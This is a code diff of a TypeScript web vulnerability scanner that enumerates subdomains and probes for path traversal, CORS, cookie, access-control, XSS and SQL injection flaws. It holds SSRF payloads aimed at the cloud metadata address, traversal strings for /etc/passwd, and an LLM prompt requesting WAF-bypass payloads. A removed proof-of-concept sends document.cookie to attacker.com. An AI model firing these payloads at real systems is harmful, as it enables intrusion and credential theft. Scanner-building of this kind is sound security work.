+    a10_ssrf: [
+      'http://169.254.169.254/latest/meta-data/',
+      'http://127.0.0.1:80/',
+      'file:///etc/passwd',
+      'http://[::1]/',
+      'http://0x7f000001/',
+      'gopher://127.0.0.1:25/',
+    ]
+  };
+
+  // AI-enhanced payload generation
+  if (apiKey && technologies.length > 0) {
+    try {
+      const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
+        method: "POST",
+        headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
+        body: JSON.stringify({
+          model: "google/gemini-2.5-flash",
+          messages: [
+            { role: "system", content: "Expert penetration tester generating WAF-bypass payloads for authorized testing. Return valid JSON only with no markdown." },
+            { role: "user", content: `Target tech: ${technologies.join(', ')}\nPorts: ${ports.join(', ')}\nServer: ${fingerprint.server || 'unknown'}\nBlocked payloads: ${failedPayloads.slice(0, 10).join(', ')}\nRelevant CVEs: ${cves.slice(0, 5).map(c => c.id).join(', ')}\n\nGenerate 5 NEW bypass payloads per OWASP category tailored to this tech stack. Return: {"a03_xss":[...],"a03_sqli":[...],"a03_cmdi":[...],"a10_ssrf":[...],"a08_integrity":[...]}` }
+          ],
+          temperature: 0.7
+        }),
+      });
+      if (resp.ok) {
+        const data = await resp.json();
+        const content = data.choices?.[0]?.message?.content || '';
+        const jsonMatch = content.match(/\{[\s\S]*\}/);
+        if (jsonMatch) {
+          const aiPayloads = JSON.parse(jsonMatch[0]);
+          for (const [key, vals] of Object.entries(aiPayloads)) {
+            if (Array.isArray(vals) && defaultPayloads[key]) {
+              defaultPayloads[key].push(...vals.filter((v: any) => typeof v === 'string'));
+            }
+          }
+        }
+      }
+    } catch (e) { console.log('AI payload gen failed:', e); }
+  }
+
+  // Filter out previously blocked
+  for (const key of Object.keys(defaultPayloads)) {
+    defaultPayloads[key] = defaultPayloads[key].filter(p => !failedPayloads.includes(p));
+  }
+
+  return defaultPayloads;
+}
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // SUBDOMAIN ENUMERATION
@@ -323,7 +666,7 @@ async function enumerateSubdomains(hostname: string): Promise<string[]> {
     }
   } catch (e) { console.log('crt.sh failed:', e); }
 
-  // 2. Common prefix brute-force with DNS resolution (Google DoH)
+  // 2. Common prefix brute-force
   const commonPrefixes = [
     'www', 'mail', 'api', 'app', 'admin', 'dev', 'staging', 'test', 'beta',
     'portal', 'login', 'auth', 'shop', 'store', 'blog', 'docs', 'support',
@@ -336,7 +679,6 @@ async function enumerateSubdomains(hostname: string): Promise<string[]> {
     'status', 'monitor', 'health', 'api2', 'api3', 'internal', 'intranet'
   ];
 
-  // DNS resolve in parallel batches of 15
   const batchSize = 15;
   for (let i = 0; i < commonPrefixes.length; i += batchSize) {
     const batch = commonPrefixes.slice(i, i + batchSize);
@@ -348,51 +690,38 @@ async function enumerateSubdomains(hostname: string): Promise<string[]> {
         );
         if (dnsResp.ok) {
           const dnsData = await dnsResp.json();
-          const ip = dnsData?.Answer?.find((a: any) => a.type === 1)?.data;
-          if (ip) found.add(fqdn);
+          if (dnsData?.Answer?.find((a: any) => a.type === 1)?.data) found.add(fqdn);
         }
       } catch {}
     }));
   }
 
-  // 3. Verify all crt.sh subdomains are actually live (DNS resolves)
+  // 3. Verify crt.sh subdomains are live
   const crtSubsToVerify = Array.from(found).filter(s => !commonPrefixes.some(p => s.startsWith(p + '.')));
   for (let i = 0; i < crtSubsToVerify.length; i += batchSize) {
     const batch = crtSubsToVerify.slice(i, i + batchSize);
     await Promise.all(batch.map(async (sub) => {
       try {
-        const dnsResp = await fetchWithTimeout(
-          `https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=A`, 5000
-        );
+        const dnsResp = await fetchWithTimeout(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=A`, 5000);
         if (dnsResp.ok) {
           const dnsData = await dnsResp.json();
-          const ip = dnsData?.Answer?.find((a: any) => a.type === 1)?.data;
-          if (!ip) found.delete(sub);  // remove if not resolving
+          if (!dnsData?.Answer?.find((a: any) => a.type === 1)?.data) found.delete(sub);
         }
       } catch { found.delete(sub); }
     }));
   }
 
-  const unique = Array.from(found).slice(0, 50);
-  console.log(`[SUBDOMAINS] Found ${unique.length} live subdomains for ${hostname}`);
-  return unique;
+  return Array.from(found).slice(0, 50);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// ENDPOINT DISCOVERY
+// ENDPOINT DISCOVERY + PORT SCANNING
 // ═══════════════════════════════════════════════════════════════════════════════
 async function discoverEndpoints(target: URL, shodanKey: string | undefined, maxDepth: number): Promise<any> {
   const results: any = {
-    endpoints: [target.toString()],
-    subdomains: [],
-    forms: [],
-    params: [],
-    apiEndpoints: [],
-    authEndpoints: [],
-    workflows: [],
-    technologies: [],
-    headers: {},
-    serverInfo: null
+    endpoints: [target.toString()], subdomains: [], forms: [], params: [],
+    apiEndpoints: [], authEndpoints: [], workflows: [], technologies: [],
+    headers: {}, serverInfo: null, ports: []
   };
 
   try {
@@ -402,6 +731,7 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
       results.headers = Object.fromEntries(mainPage.headers.entries());
       results.serverInfo = mainPage.headers.get('server');
 
+      // Extract links
       const linkMatches = html.match(/(?:href|src|action)=["']([^"']+)["']/gi) || [];
       for (const match of linkMatches) {
         const url = match.replace(/^(?:href|src|action)=["']/i, '').replace(/["']$/, '');
@@ -415,18 +745,18 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
 
       // Extract forms
       const formMatches = html.match(/<form[^>]*>[\s\S]*?<\/form>/gi) || [];
-      results.forms = formMatches.slice(0, 20).map((form, i) => {
+      results.forms = formMatches.slice(0, 20).map((form: string, i: number) => {
         const action = form.match(/action=["']([^"']+)["']/i)?.[1] || '';
         const method = form.match(/method=["']([^"']+)["']/i)?.[1] || 'GET';
-        const inputs = (form.match(/<input[^>]+>/gi) || []).map(inp => {
+        const inputs = (form.match(/<input[^>]+>/gi) || []).map((inp: string) => {
           const name = inp.match(/name=["']([^"']+)["']/i)?.[1];
           const type = inp.match(/type=["']([^"']+)["']/i)?.[1] || 'text';
           return { name, type };
-        }).filter(i => i.name);
-        const textareas = (form.match(/<textarea[^>]+>/gi) || []).map(ta => {
+        }).filter((i: any) => i.name);
+        const textareas = (form.match(/<textarea[^>]+>/gi) || []).map((ta: string) => {
           const name = ta.match(/name=["']([^"']+)["']/i)?.[1];
           return { name, type: 'textarea' };
-        }).filter(t => t.name);
+        }).filter((t: any) => t.name);
         return { id: i, action, method: method.toUpperCase(), inputs: [...inputs, ...textareas] };
       });
 
@@ -444,17 +774,24 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
       const techMap: [string, string[]][] = [
         ['WordPress', ['wp-content', 'WordPress']],
         ['PHP', ['.php']],
-        ['ASP.NET', ['.aspx']],
-        ['React', ['React', '_react']],
+        ['ASP.NET', ['.aspx', 'ASP.NET']],
+        ['React', ['React', '_react', 'react-dom']],
         ['Angular', ['Angular', 'ng-']],
         ['Vue.js', ['Vue', 'v-bind']],
-        ['jQuery', ['jQuery']],
-        ['Laravel', ['Laravel']],
-        ['Django', ['Django']],
+        ['jQuery', ['jQuery', 'jquery']],
+        ['Laravel', ['Laravel', 'laravel']],
+        ['Django', ['Django', 'csrfmiddlewaretoken']],
         ['Express.js', ['express']],
+        ['Spring', ['JSESSIONID', 'spring']],
+        ['Ruby on Rails', ['Rails', 'csrf-token']],
+        ['Node.js', ['node', 'express']],
+        ['Nginx', ['nginx']],
+        ['Apache', ['apache', 'Apache']],
       ];
       for (const [tech, markers] of techMap) {
-        if (markers.some(m => html.includes(m))) results.technologies.push(tech);
+        if (markers.some(m => html.includes(m) || (results.serverInfo || '').toLowerCase().includes(m.toLowerCase()))) {
+          results.technologies.push(tech);
+        }
       }
     }
   } catch (e: any) {
@@ -469,7 +806,9 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
     '/robots.txt', '/sitemap.xml', '/wp-admin', '/wp-json',
     '/phpinfo.php', '/server-status', '/.git/config', '/.env',
     '/health', '/healthz', '/metrics', '/debug', '/test',
-    '/backup', '/upload', '/uploads', '/files', '/static'
+    '/backup', '/upload', '/uploads', '/files', '/static',
+    '/.svn/entries', '/.DS_Store', '/web.config', '/crossdomain.xml',
+    '/wp-config.php.bak', '/.htpasswd', '/config.yml'
   ];
 
   for (let i = 0; i < commonPaths.length; i += 10) {
@@ -487,7 +826,7 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
     }));
   }
 
-  // Shodan integration
+  // Shodan for ports + vulns
   if (shodanKey) {
     try {
       const shodanResp = await fetchWithTimeout(`https://api.shodan.io/dns/resolve?hostnames=${target.hostname}&key=${shodanKey}`, 10000);
@@ -499,9 +838,10 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
           if (hostResp.ok) {
             const hostData = await hostResp.json();
             results.shodanData = { ip, ports: hostData.ports || [], vulns: hostData.vulns || [] };
+            results.ports = hostData.ports || [];
             for (const port of (hostData.ports || [])) {
-              if ([80, 443, 8080, 8443, 3000, 5000].includes(port)) {
-                const proto = [443, 8443].includes(port) ? 'https' : 'http';
+              if ([80, 443, 8080, 8443, 3000, 5000, 9090, 4443].includes(port)) {
+                const proto = [443, 8443, 4443].includes(port) ? 'https' : 'http';
                 results.endpoints.push(`${proto}://${target.hostname}:${port}/`);
               }
             }
@@ -516,244 +856,13 @@ async function discoverEndpoints(target: URL, shodanKey: string | undefined, max
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// CORS MISCONFIGURATION SCANNER
+// FULL OWASP TOP 10 ENDPOINT ASSESSMENT
 // ═══════════════════════════════════════════════════════════════════════════════
-async function scanCORS(targetUrl: string): Promise<Finding[]> {
-  const findings: Finding[] = [];
-
-  const attackOrigins = [
-    'https://evil.com',
-    'https://attacker.com',
-    'null',
-    `https://evil.${new URL(targetUrl).hostname}`,
-  ];
-
-  for (const origin of attackOrigins) {
-    try {
-      // Technique 1: Preflight OPTIONS with malicious Origin
-      const optionsResp = await fetchWithTimeout(targetUrl, 10000, {
-        method: 'OPTIONS',
-        headers: {
-          'Origin': origin,
-          'Access-Control-Request-Method': 'GET',
-          'Access-Control-Request-Headers': 'authorization'
-        }
-      });
-
-      const acao = optionsResp.headers.get('access-control-allow-origin');
-      const acac = optionsResp.headers.get('access-control-allow-credentials');
-
-      // Technique 2: GET request with same malicious Origin
-      const getResp = await fetchWithTimeout(targetUrl, 10000, {
-        method: 'GET',
-        headers: { 'Origin': origin }
-      });
-      const acao2 = getResp.headers.get('access-control-allow-origin');
-
-      // Dual confirm: both OPTIONS and GET agree on malicious origin reflection
-      const reflectsInOptions = acao === origin || acao === '*';
-      const reflectsInGet = acao2 === origin || acao2 === '*';
-
-      if (reflectsInOptions && reflectsInGet) {
-        const withCredentials = acac === 'true';
-        findings.push({
-          id: `CORS-REFLECT-${Date.now()}-${origin.replace(/[^a-z]/gi, '')}`,
-          severity: withCredentials ? 'critical' : 'high',
-          title: `CORS Misconfiguration: Arbitrary Origin Reflected`,
-          description: `The server reflects the Origin "${origin}" in Access-Control-Allow-Origin. ${withCredentials ? 'Combined with credentials=true this allows session theft.' : 'Allows cross-origin data exfiltration.'}`,
-          endpoint: targetUrl,
-          method: 'GET',
-          payload: `Origin: ${origin}`,
-          evidence: `OPTIONS ACAO: ${acao}`,
-          evidence2: `GET ACAO: ${acao2} (dual-confirmed)`,
-          dualConfirmed: true,
-          remediation: 'Whitelist specific trusted origins. Never reflect arbitrary Origin headers.',
-          cwe: 'CWE-346',
-          cvss: withCredentials ? 9.3 : 7.4,
-          mitre: ['T1557'],
-          confidence: 95,
-          poc: `# CORS exploitation PoC\nfetch("${targetUrl}", {\n  credentials: "include",\n  headers: { "Origin": "${origin}" }\n}).then(r=>r.text()).then(console.log)`
-        });
-        break; // one finding per target is enough
-      }
-    } catch {}
-  }
-
-  return findings;
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// DIRECTORY TRAVERSAL SCANNER
-// ═══════════════════════════════════════════════════════════════════════════════
-async function scanDirectoryTraversal(targetUrl: string, extractedParams: string[]): Promise<Finding[]> {
-  const findings: Finding[] = [];
-  const base = new URL(targetUrl);
-
-  const traversalPayloads = [
-    '../../../etc/passwd',
-    '....//....//....//etc/passwd',
-    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-    '..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%252F..%252F..%252Fetc%252Fpasswd',
-    '/etc/passwd%00',
-    '....\\....\\....\\windows\\win.ini',
-  ];
-
-  // Common file params to test
-  const fileParams = [...new Set([...extractedParams, 'file', 'path', 'page', 'include', 'load', 'template', 'doc', 'document', 'read', 'view', 'open'])];
-
-  for (const param of fileParams.slice(0, 8)) {
-    for (const payload of traversalPayloads.slice(0, 4)) {
-      try {
-        // Technique 1: inject payload
-        const testUrl = new URL(targetUrl);
-        testUrl.searchParams.set(param, payload);
-        const resp1 = await fetchWithTimeout(testUrl.toString(), 10000);
-        const body1 = await resp1.text();
-
-        const isLinuxPasswd = body1.includes('root:x:0:0') || body1.includes('/bin/bash') || body1.includes('/sbin/nologin');
-        const isWindowsIni = body1.toLowerCase().includes('[extensions]') || body1.toLowerCase().includes('[mci extensions]');
-
-        if (isLinuxPasswd || isWindowsIni) {
-          // Technique 2: use a different encoding to dual-confirm
-          const payload2 = payload.replace(/\.\./g, '%2e%2e').replace(/\//g, '%2f');
-          const testUrl2 = new URL(targetUrl);
-          testUrl2.searchParams.set(param, payload2);
-          const resp2 = await fetchWithTimeout(testUrl2.toString(), 10000);
-          const body2 = await resp2.text();
-          const dualConfirmed = body2.includes('root:x:0:0') || body2.includes('/bin/bash') ||
-            body2.toLowerCase().includes('[extensions]');
-
-          findings.push({
-            id: `TRAVERSAL-${Date.now()}-${param}`,
-            severity: 'critical',
-            title: `Directory Traversal / Path Traversal in "${param}"`,
-            description: `Parameter "${param}" allows reading arbitrary files from the server. /etc/passwd content retrieved.`,
-            endpoint: testUrl.toString(),
-            method: 'GET',
-            payload,
-            evidence: `Response contains OS file content: "${body1.slice(0, 200)}"`,
-            evidence2: dualConfirmed ? `Second encoding also confirmed traversal (dual-confirmed)` : `Single technique (needs manual verify)`,
-            dualConfirmed,
-            remediation: 'Validate all file paths against an allowlist. Never pass user input directly to file operations.',
-            cwe: 'CWE-22',
-            cvss: 9.3,
-            mitre: ['T1083', 'T1552'],
-            confidence: dualConfirmed ? 97 : 75,
-            poc: `curl "${testUrl.toString()}"`,
-            exploitCode: `import requests\nurl = "${testUrl.toString()}"\nr = requests.get(url)\nprint(r.text[:500])`
-          });
-          break;
-        }
-      } catch {}
-    }
-  }
-
-  return findings;
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// COOKIE HIJACKING / SESSION SECURITY SCANNER
-// ═══════════════════════════════════════════════════════════════════════════════
-async function scanCookieSecurity(targetUrl: string): Promise<Finding[]> {
-  const findings: Finding[] = [];
-
-  try {
-    const resp = await fetchWithTimeout(targetUrl, 12000);
-    const cookieHeader = resp.headers.get('set-cookie');
-
-    if (!cookieHeader) return findings;
-
-    // Parse all Set-Cookie headers (may be comma-separated if multiple)
-    const cookies = cookieHeader.split(/,(?=[^;])/);
-    const isHTTPS = targetUrl.startsWith('https');
-
-    for (const cookie of cookies) {
-      const cookieLower = cookie.toLowerCase();
-      const cookieName = cookie.split('=')[0].trim();
-
-      // Missing HttpOnly flag → XSS can steal cookie
-      if (!cookieLower.includes('httponly')) {
-        // Technique 1: flag absence in Set-Cookie
-        // Technique 2: confirm by checking that JS access would work (heuristic - presence of inline scripts)
-        const bodyText = await resp.text().catch(() => '');
-        const hasInlineScripts = /<script[^>]*>[^<]{10,}/i.test(bodyText);
-
-        findings.push({
-          id: `COOKIE-NOHTTPONLY-${Date.now()}-${cookieName.slice(0, 10)}`,
-          severity: hasInlineScripts ? 'high' : 'medium',
-          title: `Cookie "${cookieName}" Missing HttpOnly Flag`,
-          description: `Cookie "${cookieName}" is accessible via JavaScript. If XSS is present, attackers can steal this cookie and hijack the session.`,
-          endpoint: targetUrl,
-          method: 'GET',
-          evidence: `Set-Cookie: ${cookie.slice(0, 150)}`,
-          evidence2: hasInlineScripts ? 'Inline scripts detected — XSS → cookie theft vector confirmed' : 'No inline scripts, medium confidence',
-          dualConfirmed: hasInlineScripts,
-          remediation: 'Add HttpOnly flag to all session cookies: Set-Cookie: sessionid=...; HttpOnly; Secure; SameSite=Strict',
-          cwe: 'CWE-1004',
-          cvss: hasInlineScripts ? 7.4 : 5.4,
-          mitre: ['T1539'],
-          confidence: hasInlineScripts ? 88 : 72,
-          poc: `# Cookie hijacking PoC (requires XSS entry point)\nfetch("https://attacker.com/steal?c="+document.cookie)`
-        });
-      }
-
-      // Missing Secure flag → sent over HTTP
-      if (!cookieLower.includes('; secure') && !cookieLower.includes(',secure') && isHTTPS) {
-        findings.push({
-          id: `COOKIE-NOSECURE-${Date.now()}-${cookieName.slice(0, 10)}`,
-          severity: 'medium',
-          title: `Cookie "${cookieName}" Missing Secure Flag`,
-          description: `Cookie "${cookieName}" can be transmitted over unencrypted HTTP connections, enabling interception via MITM attacks.`,
-          endpoint: targetUrl,
-          method: 'GET',
-          evidence: `Set-Cookie: ${cookie.slice(0, 150)}`,
-          evidence2: 'Site serves HTTPS but cookie lacks Secure flag (dual-confirmed by protocol mismatch)',
-          dualConfirmed: true,
-          remediation: 'Add Secure flag: Set-Cookie: sessionid=...; Secure; HttpOnly; SameSite=Strict',
-          cwe: 'CWE-614',
-          cvss: 6.5,
-          mitre: ['T1557'],
-          confidence: 90,
-          poc: `curl -k http://${new URL(targetUrl).hostname}/ -v 2>&1 | grep -i set-cookie`
-        });
-      }
-
-      // Missing SameSite → CSRF-able
-      if (!cookieLower.includes('samesite')) {
-        findings.push({
-          id: `COOKIE-NOSAMESITE-${Date.now()}-${cookieName.slice(0, 10)}`,
-          severity: 'medium',
-          title: `Cookie "${cookieName}" Missing SameSite Attribute`,
-          description: `Cookie "${cookieName}" has no SameSite attribute, making it vulnerable to CSRF attacks.`,
-          endpoint: targetUrl,
-          method: 'GET',
-          evidence: `Set-Cookie: ${cookie.slice(0, 150)}`,
-          evidence2: 'SameSite absence confirmed via header inspection',
-          dualConfirmed: true,
-          remediation: 'Add SameSite=Strict or SameSite=Lax to all session cookies',
-          cwe: 'CWE-352',
-          cvss: 5.4,
-          mitre: ['T1185'],
-          confidence: 92,
-          poc: `# CSRF PoC\n<form action="${targetUrl}" method="POST">\n  <input type="hidden" name="transfer_to" value="attacker"/>\n  <input type="submit"/>\n</form>`
-        });
-      }
-    }
-  } catch {}
-
-  return findings;
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// ENDPOINT VULNERABILITY ASSESSMENT (dual-confirm)
-// ═══════════════════════════════════════════════════════════════════════════════
-async function assessEndpoint(
+async function assessEndpointOWASP(
   endpoint: string,
   fingerprint: any,
-  apiKey: string | undefined,
-  failedPayloads: string[],
-  retryWithAI: boolean
+  payloads: Record<string, string[]>,
+  failedPayloads: string[]
 ): Promise<Finding[]> {
   const findings: Finding[] = [];
 
@@ -762,259 +871,276 @@ async function assessEndpoint(
     const status = response.status;
     const responseText = await response.text();
 
-    // ── Sensitive file exposure ──────────────────────────────────────────────
-    if ((endpoint.includes('.git') || endpoint.includes('.env') || endpoint.includes('config')) && status === 200) {
-      // Dual-confirm: also check that response contains actual config content
+    // ── A01: Broken Access Control ──────────────────────────────────────
+    if ((endpoint.includes('.git') || endpoint.includes('.env') || endpoint.includes('config') || endpoint.includes('.svn') || endpoint.includes('.htpasswd')) && status === 200) {
       const hasRealContent = responseText.includes('[') || responseText.includes('=') || responseText.includes('{');
-      if (hasRealContent) {
+      if (hasRealContent && responseText.length > 20) {
         findings.push({
-          id: `EXPOSURE-${Date.now()}`,
-          severity: 'critical',
+          id: `A01-EXPOSURE-${Date.now()}`, severity: 'critical',
           title: `Sensitive File Exposed: ${endpoint.split('/').pop()}`,
-          description: 'Critical configuration or version control file is publicly accessible.',
-          endpoint,
-          method: 'GET',
-          evidence: `HTTP ${status} — Content snippet: ${responseText.slice(0, 200)}`,
-          evidence2: 'Content contains config-like patterns (dual-confirmed)',
-          dualConfirmed: true,
-          remediation: 'Block access to sensitive files via web server configuration (deny in .htaccess or nginx)',
-          cwe: 'CWE-200',
-          cvss: 9.0,
-          mitre: ['T1552'],
-          confidence: 96,
-          poc: `curl -X GET "${endpoint}"`
+          description: 'Critical file publicly accessible — may contain credentials, API keys, or source code.',
+          endpoint, method: 'GET', owasp: 'A01:2021',
+          evidence: `HTTP ${status} — Content: ${responseText.slice(0, 150)}`,
+          evidence2: 'Content contains config patterns (dual-confirmed)',
+          dualConfirmed: true, remediation: 'Block access via server config. Add to .htaccess deny rules.',
+          cwe: 'CWE-200', cvss: 9.0, mitre: ['T1552'], confidence: 96, category: 'access_control',
+          poc: `curl -s "${endpoint}" | head -20`
         });
       }
     }
 
-    // ── API/Admin exposure ───────────────────────────────────────────────────
-    if ((endpoint.includes('swagger') || endpoint.includes('api-docs') || endpoint.includes('openapi')) && status === 200) {
+    if ((endpoint.includes('admin') || endpoint.includes('debug') || endpoint.includes('console') || endpoint.includes('panel')) && status === 200 && responseText.length > 200) {
       findings.push({
-        id: `API-DOCS-${Date.now()}`,
-        severity: 'medium',
-        title: 'API Documentation Exposed',
-        description: 'API docs are publicly accessible, revealing internal endpoints and authentication flows.',
-        endpoint,
-        method: 'GET',
-        evidence: `HTTP ${status}`,
-        evidence2: 'URL path matches known API doc patterns',
-        dualConfirmed: true,
-        remediation: 'Restrict API documentation to authenticated users',
-        cwe: 'CWE-200',
-        confidence: 90,
-        poc: `curl -X GET "${endpoint}"`
-      });
-    }
-
-    if ((endpoint.includes('admin') || endpoint.includes('debug') || endpoint.includes('console')) && status === 200) {
-      findings.push({
-        id: `ADMIN-${Date.now()}`,
-        severity: 'high',
+        id: `A01-ADMIN-${Date.now()}`, severity: 'high',
         title: `Admin/Debug Panel Accessible: ${endpoint.split('/').pop()}`,
-        description: 'Admin or debug interface accessible without authentication',
-        endpoint,
-        method: 'GET',
-        evidence: `HTTP ${status}`,
-        evidence2: 'URL path contains admin/debug keywords AND returns 200',
-        dualConfirmed: true,
-        remediation: 'Implement authentication for admin/debug panels',
-        cwe: 'CWE-306',
-        cvss: 7.5,
-        confidence: 85,
-        poc: `curl -X GET "${endpoint}"`
+        description: 'Administrative interface accessible without authentication.',
+        endpoint, method: 'GET', owasp: 'A01:2021',
+        evidence: `HTTP ${status}, body ${responseText.length} bytes`,
+        evidence2: 'URL path + 200 response confirms exposure',
+        dualConfirmed: true, remediation: 'Implement authentication for admin panels.',
+        cwe: 'CWE-306', cvss: 7.5, confidence: 85, category: 'access_control',
+        poc: `curl -s "${endpoint}" | head -30`
       });
     }
 
-    // ── Security headers (only once per unique host) ─────────────────────────
-    const isRootEndpoint = !endpoint.includes('?') && (endpoint.endsWith('/') || endpoint.split('/').length <= 4);
-    if (isRootEndpoint) {
-      const secHeaders: Array<[string, string, string]> = [
-        ['x-frame-options', 'CWE-1021', 'Add X-Frame-Options: DENY or SAMEORIGIN'],
-        ['content-security-policy', 'CWE-79', 'Implement a strict Content-Security-Policy header'],
-        ['strict-transport-security', 'CWE-319', 'Add Strict-Transport-Security: max-age=31536000; includeSubDomains'],
-        ['x-content-type-options', 'CWE-430', 'Add X-Content-Type-Options: nosniff'],
-      ];
-      for (const [hdr, cwe, remediation] of secHeaders) {
-        if (!response.headers.get(hdr)) {
-          findings.push({
-            id: `HDR-${hdr.toUpperCase().replace(/-/g, '')}-${endpoint.replace(/[^a-z0-9]/gi, '').slice(0, 20)}`,
-            severity: 'low',
-            title: `Missing ${hdr.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join('-')}`,
-            description: `Security header "${hdr}" is not present`,
-            endpoint,
-            evidence: 'Header absent from response',
-            evidence2: 'Absence confirmed on root endpoint',
-            dualConfirmed: true,
-            remediation,
-            cwe,
-            confidence: 100
-          });
-        }
-      }
-    }
-
-    // ── Server/tech disclosure ───────────────────────────────────────────────
-    const serverHeader = response.headers.get('server');
-    const xPoweredBy = response.headers.get('x-powered-by');
-    if (serverHeader) {
+    // ── A02: Cryptographic Failures ─────────────────────────────────────
+    if (!endpoint.startsWith('https://')) {
       findings.push({
-        id: `SVR-DISC-${endpoint.replace(/[^a-z0-9]/gi, '').slice(0, 20)}`,
-        severity: 'low',
-        title: `Server Version Disclosure: ${serverHeader}`,
-        description: `Server header reveals: "${serverHeader}"`,
-        endpoint,
-        evidence: `Server: ${serverHeader}`,
-        evidence2: 'Header value contains version string',
-        dualConfirmed: true,
-        remediation: 'Remove or obfuscate the Server header',
-        cwe: 'CWE-200',
-        confidence: 100
-      });
-    }
-    if (xPoweredBy) {
-      findings.push({
-        id: `TECH-DISC-${endpoint.replace(/[^a-z0-9]/gi, '').slice(0, 20)}`,
-        severity: 'low',
-        title: `Tech Stack Disclosure: ${xPoweredBy}`,
-        description: `X-Powered-By: "${xPoweredBy}"`,
-        endpoint,
-        evidence: `X-Powered-By: ${xPoweredBy}`,
-        evidence2: 'Header confirms stack technology',
-        dualConfirmed: true,
-        remediation: 'Remove X-Powered-By header',
-        cwe: 'CWE-200',
-        confidence: 100
+        id: `A02-NOSSL-${Date.now()}`, severity: 'high',
+        title: 'No TLS/SSL Encryption',
+        description: 'Traffic including credentials transmitted in plaintext. Vulnerable to MITM attacks.',
+        endpoint, owasp: 'A02:2021',
+        evidence: 'Endpoint uses HTTP protocol',
+        evidence2: 'No HTTPS redirect detected',
+        dualConfirmed: true, remediation: 'Implement HTTPS with valid TLS certificate.',
+        cwe: 'CWE-319', cvss: 7.4, confidence: 100, category: 'crypto',
+        poc: `curl -sI "${endpoint}" | head -5`
       });
     }
 
-    // ── XSS + SQLi via URL params (dual-confirm) ─────────────────────────────
+    // ── A03: Injection (XSS + SQLi via URL params) ──────────────────────
     try {
       const parsedUrl = new URL(endpoint);
       const params = Array.from(parsedUrl.searchParams.keys());
 
       for (const param of params.slice(0, 5)) {
-        // XSS: probe 1 + probe 2 (different vectors)
-        const xssProbe1 = '"><img src=x onerror=alert(1)>';
-        const xssProbe2 = '<svg/onload=alert(document.domain)>';
+        // XSS dual-confirm
+        const xssPayloads = payloads.a03_xss || [];
+        if (xssPayloads.length >= 2) {
+          const xssUrl1 = new URL(endpoint);
+          xssUrl1.searchParams.set(param, xssPayloads[0]);
+          const xssResp1 = await fetchWithTimeout(xssUrl1.toString(), 8000);
+          const xssBody1 = await xssResp1.text();
+          const reflected1 = xssBody1.includes(xssPayloads[0]) || xssBody1.includes('onerror=');
 
-        const xssUrl1 = new URL(endpoint);
-        xssUrl1.searchParams.set(param, xssProbe1);
-        const xssResp1 = await fetchWithTimeout(xssUrl1.toString(), 8000);
-        const xssBody1 = await xssResp1.text();
-        const xssReflected1 = xssBody1.includes(xssProbe1) || xssBody1.includes('onerror=alert');
+          if (reflected1) {
+            const xssUrl2 = new URL(endpoint);
+            xssUrl2.searchParams.set(param, xssPayloads[1]);
+            const xssResp2 = await fetchWithTimeout(xssUrl2.toString(), 8000);
+            const xssBody2 = await xssResp2.text();
+            const reflected2 = xssBody2.includes(xssPayloads[1]) || xssBody2.includes('onload=');
 
-        if (xssReflected1) {
-          const xssUrl2 = new URL(endpoint);
-          xssUrl2.searchParams.set(param, xssProbe2);
-          const xssResp2 = await fetchWithTimeout(xssUrl2.toString(), 8000);
-          const xssBody2 = await xssResp2.text();
-          const xssReflected2 = xssBody2.includes(xssProbe2) || xssBody2.includes('onload=alert');
-
-          if (xssReflected2) {
-            findings.push({
-              id: `XSS-REFLECT-${Date.now()}-${param}`,
-              severity: 'high',
-              title: `Reflected XSS in parameter "${param}" [DUAL-CONFIRMED]`,
-              description: `Parameter "${param}" reflects unsanitized input. Two independent XSS probes both reflected — confirmed, not a false positive.`,
-              endpoint: xssUrl1.toString(),
-              method: 'GET',
-              payload: xssProbe1,
-              evidence: `Probe 1 reflected: ${xssProbe1}`,
-              evidence2: `Probe 2 reflected: ${xssProbe2} — dual-confirmed`,
-              dualConfirmed: true,
-              response: xssBody1.slice(0, 500),
-              remediation: 'Implement output encoding (htmlspecialchars) and Content-Security-Policy',
-              cwe: 'CWE-79',
-              cvss: 6.1,
-              mitre: ['T1059.007'],
-              confidence: 96,
-              poc: `curl "${xssUrl1.toString()}"`,
-              exploitCode: `# Reflected XSS PoC\nwindow.location="${xssUrl1.toString()}"`
-            });
+            if (reflected2) {
+              findings.push({
+                id: `A03-XSS-${Date.now()}-${param}`, severity: 'high',
+                title: `Reflected XSS in "${param}" [DUAL-CONFIRMED]`,
+                description: `Two independent XSS probes reflected without sanitization in parameter "${param}".`,
+                endpoint: xssUrl1.toString(), method: 'GET', owasp: 'A03:2021',
+                payload: xssPayloads[0],
+                evidence: `Probe 1 reflected: ${xssPayloads[0]}`,
+                evidence2: `Probe 2 reflected: ${xssPayloads[1]}`,
+                dualConfirmed: true, remediation: 'Implement output encoding and CSP.',
+                cwe: 'CWE-79', cvss: 6.1, mitre: ['T1059.007'], confidence: 96, category: 'injection',
+                poc: `curl -s "${xssUrl1.toString()}" | grep -o 'onerror=.*'`
+              });
+            }
           }
         }
 
-        // SQLi: error-based + boolean-based dual-confirm
-        const sqliProbe1 = "' OR '1'='1' --";
-        const sqliProbeError = "'\"";
-        const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'sql error', 'odbc', 'jdbc',
+        // SQLi dual-confirm
+        const sqliPayloads = payloads.a03_sqli || [];
+        const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'sql error', 'odbc',
